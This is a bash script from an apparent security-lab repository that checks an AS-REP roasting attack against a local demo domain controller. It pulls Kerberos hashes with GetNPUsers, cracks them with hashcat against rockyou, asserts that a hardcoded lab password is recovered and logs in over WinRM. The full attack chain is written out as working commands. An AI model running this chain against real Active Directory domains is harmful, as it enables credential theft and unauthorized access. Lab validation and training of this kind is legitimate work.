#!/usr/bin/env bash
set -uo pipefail

# Validate AS-REP roast against the local ASREP demo DC.
#
# Usage:
#   ./scripts/run-local-asrep.sh
#   ./scripts/validate-asrep.sh [dc-ip]
#   ./scripts/validate-asrep.sh --siem
#
# Defaults assume QEMU user-net guest at 10.0.3.15 (avoids br-chain8 on 10.0.2.0/24).

if [ "${1:-}" = "--siem" ]; then
    shift
    exec "$(dirname "$0")/validate-asrep-siem.sh" "$@"
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"

DC_IP="${1:-${ASREP_DC_IP:-10.0.3.15}}"
DOMAIN="${ASREP_DOMAIN:-secretcon.local}"
ASREP_USER="${SECRETCON_ASREP_USER:-enite}"
ASREP_PASSWORD="${SECRETCON_ASREP_PASSWORD:-stud87}"
OUT_DIR="${ASREP_VALIDATION_DIR:-artifacts/asrep/validation}"
LOG="${ASREP_VALIDATION_LOG:-${OUT_DIR}/validate-asrep.log}"

if [ -z "${ASREP_WORDLIST:-}" ]; then
    if [ -f /usr/share/wordlists/rockyou.txt ]; then
        ASREP_WORDLIST="/usr/share/wordlists/rockyou.txt"
    elif [ -f "${REPO_ROOT}/artifacts/asrep/wordlists/smoke.txt" ]; then
        ASREP_WORDLIST="${REPO_ROOT}/artifacts/asrep/wordlists/smoke.txt"
    else
        ASREP_WORDLIST="/usr/share/wordlists/rockyou.txt"
    fi
fi
WORDLIST="$ASREP_WORDLIST"

mkdir -p "$OUT_DIR"
exec > >(tee -a "$LOG") 2>&1

echo "[*] validate-asrep log: $LOG"
echo "[*] started: $(date -Is)"
echo "[*] DC: $DC_IP  domain: $DOMAIN  user: $ASREP_USER"

PASS=0
FAIL=0
step() { echo; echo "===== $1 ====="; }
ok() { echo "[+] PASS: $1"; PASS=$((PASS + 1)); }
bad() { echo "[!] FAIL: $1" >&2; FAIL=$((FAIL + 1)); }

GET_NP_USERS=()
if command -v python3 >/dev/null 2>&1 && [ -f "$(dirname "${BASH_SOURCE[0]}")/asrep-getnpusers.py" ]; then
    GET_NP_USERS=(python3 "$(dirname "${BASH_SOURCE[0]}")/asrep-getnpusers.py")
elif command -v impacket-GetNPUsers >/dev/null 2>&1; then
    GET_NP_USERS=(impacket-GetNPUsers)
elif command -v GetNPUsers.py >/dev/null 2>&1; then
    GET_NP_USERS=(GetNPUsers.py)
fi
if [ "${#GET_NP_USERS[@]}" -eq 0 ]; then
    echo "[!] GetNPUsers not found — run: nix develop .#kali" >&2
    exit 2
fi

KRB_FWD_PORT="${ASREP_KERBEROS_PORT:-18088}"
KRB_VIA_FWD=0
if ! nc -z -w2 "$DC_IP" 88 2>/dev/null && nc -z -w2 127.0.0.1 "$KRB_FWD_PORT" 2>/dev/null; then
    KRB_VIA_FWD=1
    export ASREP_KDC_PORT="$KRB_FWD_PORT"
    DC_IP="127.0.0.1"
    echo "[*] using localhost Kerberos forward 127.0.0.1:${KRB_FWD_PORT} (guest slirp IP not routed on host)"
fi

USERS_FILE="${OUT_DIR}/users.txt"
cat > "$USERS_FILE" <<EOF
${ASREP_USER}
jdoe
asmith
bwilson
clee
dpark
administrator
EOF

HASH_FILE="${OUT_DIR}/asrep.hashes"
rm -f "$HASH_FILE"

step "wait for Kerberos (port 88)"
deadline=$((SECONDS + 300))
KRB_CHECK_PORT="${ASREP_KDC_PORT:-88}"
while [ "$SECONDS" -lt "$deadline" ]; do
    if nc -z -w2 "$DC_IP" "$KRB_CHECK_PORT" 2>/dev/null; then
        if [ "$KRB_VIA_FWD" -eq 1 ]; then
            ok "kerberos forward open on ${DC_IP}:${KRB_CHECK_PORT}"
        else
            ok "kerberos port open on ${DC_IP}:${KRB_CHECK_PORT}"
        fi
        break
    fi
    if [ "$KRB_VIA_FWD" -eq 0 ] && nc -z -w2 127.0.0.1 "$KRB_FWD_PORT" 2>/dev/null; then
        KRB_VIA_FWD=1
        export ASREP_KDC_PORT="$KRB_FWD_PORT"
        DC_IP="127.0.0.1"
        KRB_CHECK_PORT="$KRB_FWD_PORT"
        ok "kerberos forward open on 127.0.0.1:${KRB_FWD_PORT}"
        break
    fi
    sleep 5
done
if ! nc -z -w2 "$DC_IP" "${ASREP_KDC_PORT:-88}" 2>/dev/null; then
    bad "kerberos not reachable (tried ${DC_IP}:${ASREP_KDC_PORT:-88})"
fi

step "GetNPUsers"
if "${GET_NP_USERS[@]}" "${DOMAIN}/" \
    -usersfile "$USERS_FILE" \
    -no-pass \
    -dc-ip "$DC_IP" \
    -format hashcat \
    -outputfile "$HASH_FILE" \
    -request; then
    if [ -s "$HASH_FILE" ]; then
        ok "GetNPUsers completed"
    else
        bad "GetNPUsers returned no hashes"
    fi
else
    bad "GetNPUsers failed"
fi

step "assert hash for ${ASREP_USER}"
if [ -f "$HASH_FILE" ] && grep -qi "${ASREP_USER}" "$HASH_FILE"; then
    ok "hash line present for ${ASREP_USER}"
    grep -i "${ASREP_USER}" "$HASH_FILE" || true
else
    bad "no hash for ${ASREP_USER} in $HASH_FILE"
fi

step "hashcat crack (optional)"
if command -v hashcat >/dev/null 2>&1 && [ -f "$WORDLIST" ] && [ -s "$HASH_FILE" ]; then
    if hashcat -m 18200 -a 0 "$HASH_FILE" "$WORDLIST" --quiet --force 2>/dev/null; then
        if hashcat -m 18200 --show "$HASH_FILE" 2>/dev/null | grep -q ":${ASREP_PASSWORD}\$"; then
            ok "hashcat cracked password to ${ASREP_PASSWORD}"
            hashcat -m 18200 --show "$HASH_FILE" 2>/dev/null || true
        else
            bad "hashcat did not recover ${ASREP_PASSWORD}"
        fi
    else
        bad "hashcat run failed"
    fi
else
    echo "[~] SKIP hashcat (missing hashcat or wordlist at $WORDLIST)"
fi

step "WinRM domain smoke (optional)"
WINRM_PORT="${ASREP_WINRM_PORT:-15986}"
if python3 -c "import winrm" 2>/dev/null && nc -z -w2 127.0.0.1 "$WINRM_PORT" 2>/dev/null; then
    if python3 - "$ASREP_USER" "$DOMAIN" <<'PY'
import sys, winrm
user, domain = sys.argv[1:3]
port = __import__("os").environ.get("ASREP_WINRM_PORT", "15986")
host = "127.0.0.1"
pw = __import__("os").environ.get("SECRETCON_ASREP_PASSWORD", "stud87")
s = winrm.Session(f"http://{host}:{port}/wsman", auth=(f"{domain}\\{user}", pw), transport="ntlm")
r = s.run_ps("(Get-ADDomain).DNSRoot")
print(r.std_out.decode(errors="replace").strip())
sys.exit(0 if r.status_code == 0 else 1)
PY
    then
        ok "WinRM logon as ${ASREP_USER}"
    else
        echo "[~] SKIP WinRM smoke (logon failed for ${ASREP_USER}@${DOMAIN})"
    fi
else
    echo "[~] SKIP WinRM smoke (agent unavailable or port ${WINRM_PORT} closed)"
fi

echo
echo "===== validate-asrep ====="
echo "  $PASS pass / $FAIL fail"
echo "  finished: $(date -Is)"
echo "========================="
[ "$FAIL" -eq 0 ]
